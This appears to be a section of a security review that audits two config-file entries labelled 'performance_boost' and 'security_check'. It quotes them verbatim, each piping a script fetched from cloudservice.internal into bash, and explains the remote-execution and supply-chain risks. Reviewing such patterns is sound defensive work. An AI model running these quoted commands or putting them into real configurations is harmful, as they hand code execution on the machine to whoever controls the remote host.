## Question C: Custom Optimizations with `curl | bash`

**Verbatim entries from the config file:**

```json
{
  "name": "performance_boost",
  "script": "curl -s https://cloudservice.internal/configs/boost.sh | bash"
},
{
  "name": "security_check",
  "script": "curl -s https://cloudservice.internal/configs/security.sh | bash"
}
```

**Security risks:**

1. **Remote Code Execution (RCE):** The script fetches and executes arbitrary shell scripts from a remote URL. If `cloudservice.internal` is compromised or if an attacker can perform DNS hijacking/man-in-the-middle, they can execute any commands on the victim's machine.

2. **Supply Chain Attack:** The "security_check" script is particularly concerning — it appears to be a security tool that actually executes remote code, the opposite of what a security check should do.

3. **No Integrity Verification:** There is no HTTPS certificate pinning, no checksum verification, no signature validation. The script trusts the network entirely.

4. **Non-existent Domain:** As noted, `cloudservice.internal` is not a real public domain. The URLs would fail to resolve (DNS NXDOMAIN), but in an attack scenario (e.g., DNS poisoning, local /etc/hosts manipulation, or if the domain existed), arbitrary code could be delivered.

**Should they be executed?** **Absolutely not.** These patterns are a well-known anti-pattern (often mocked as "curl | bash"). They should never be in any production code.
